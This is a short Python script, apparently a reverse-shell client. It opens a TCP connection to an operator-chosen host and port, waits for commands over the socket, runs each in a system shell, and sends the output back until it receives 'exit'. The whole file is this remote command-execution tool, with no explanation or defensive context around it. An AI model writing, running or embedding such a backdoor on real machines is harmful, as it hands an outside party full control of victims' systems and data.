import socket
import subprocess
import sys

def client_program(target_ip='127.0.0.1', target_port=9999):
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((target_ip, target_port))

    while True:
        try:
            command = client_socket.recv(1024).decode('utf-8')
            if command.lower() == 'exit':
                break
            if command.strip():
                output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
                client_socket.send(output)
        except Exception as e:
            client_socket.send(str(e).encode('utf-8'))

    client_socket.close()

if __name__ == "__main__":
    if len(sys.argv) == 3:
        target_ip = sys.argv[1]
        target_port = int(sys.argv[2])
    else:
        target_ip = '127.0.0.1'
        target_port = 9999

    client_program(target_ip, target_port)
